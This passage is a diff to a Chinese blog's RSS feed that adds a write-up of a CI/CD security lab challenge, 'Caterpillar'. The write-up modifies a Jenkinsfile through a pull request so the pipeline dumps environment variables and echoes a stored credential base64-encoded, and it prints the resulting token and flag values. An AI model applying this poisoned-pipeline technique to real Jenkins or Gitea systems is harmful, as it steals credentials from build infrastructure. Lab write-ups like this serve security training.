@@ -224,7 +224,78 @@ loading="lazy"
 >&lt;/p>
 &lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210085822.png"
 loading="lazy"
->&lt;/p></description></item><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
+>&lt;/p>
+&lt;h3 id="总结-2">总结&lt;/h3>
+&lt;p>这道题通过检测 Git 仓库的历史记录，寻找可能暴露的 PyPi 令牌。由于历史中可能有一些敏感信息的泄漏，使用工具如 gitleaks 可以帮助发现这些泄露的凭证。最终，通过查看提交历史并提取出 PyPi 令牌，获取了 flag。&lt;/p>
+&lt;h2 id="moderate---caterpillar">Moderate - Caterpillar&lt;/h2>
+&lt;h3 id="提示-3">提示&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">你是谁？你只有读取权限……这足够吗？利用你对 Wonderland/caterpillar 仓库的访问权限来窃取存储在 Jenkins 凭证存储中的 flag2 密钥。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">首先，Fork 这个仓库并创建一个 Pull Request，以触发一个恶意的流水线。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">在执行恶意代码并触发 Jenkins 作业后，哪些环境变量可以帮助你继续前进？
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">在流水线中找到了 Gitea 访问令牌？很好。现在还有另一个流水线，它是通过推送到主分支触发的。也许你能从那里获取到 flag！
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="过程-3">过程&lt;/h3>
+&lt;p>先fork&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git clone http://localhost:3000/thealice/caterpillar.git
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>修改Jenkinsfile,修改Install_Requirements阶段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-groovy" data-lang="groovy">&lt;span class="line">&lt;span class="cl">&lt;span class="n">pipeline&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">agent&lt;/span> &lt;span class="n">any&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stages&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;Install_Requirements&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">steps&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sh&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> env
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 执行安装依赖步骤
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 其他阶段...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git add .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git commit -m &lt;span class="s2">&amp;#34;challenage2-1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git config --global user.email &lt;span class="s2">&amp;#34;you@example.com&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git config --global user.name &lt;span class="s2">&amp;#34;Your Name&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git commit -m &lt;span class="s2">&amp;#34;challenage2-1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git push
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>提交pr
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210092127.png"
+loading="lazy"
+>
+jenkins的这个提交的console output中得到
+GITEA_TOKEN=5d3ed5564341d5060c8524c41fe03507e296ca46
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210092718.png"
+loading="lazy"
+>
+修改Jenkinsfile的deploy阶段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-groovy" data-lang="groovy">&lt;span class="line">&lt;span class="cl">&lt;span class="n">pipeline&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">agent&lt;/span> &lt;span class="n">any&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stages&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;deploy&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">steps&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">withCredentials&lt;/span>&lt;span class="o">([&lt;/span>&lt;span class="n">usernamePassword&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nl">credentialsId:&lt;/span> &lt;span class="s1">&amp;#39;flag2&amp;#39;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nl">usernameVariable:&lt;/span> &lt;span class="s1">&amp;#39;flag2&amp;#39;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nl">passwordVariable:&lt;/span> &lt;span class="s1">&amp;#39;TOKEN&amp;#39;&lt;/span>&lt;span class="o">)])&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sh&lt;/span> &lt;span class="s1">&amp;#39;echo $TOKEN | base64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 其他阶段...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再创建分支并提交、合并，即可触发另一个wonderland-caterpillar-prod的管道&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git checkout -b challenge2-1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git add .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git commit -m &lt;span class="s2">&amp;#34;challenge2-1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git push -u origin challenge2-1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>console output中得到flag=AEB14966-FFC2-4FB0-BF45-CD903B3535DA
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210093811.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210093727.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="总结-3">总结&lt;/h3>
+&lt;p>和Easy的前两道题有些类似，修改和利用 Jenkinsfile 触发恶意流水线。&lt;/p></description></item><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
 &lt;p>1.cmd下管理员权限执行&lt;code>netsh winsock reset&lt;/code>&lt;br>
 2.重启电脑&lt;br>
 &lt;a class="link" href="https://blog.csdn.net/qq_41048761/article/details/121420814" target="_blank" rel="noopener"
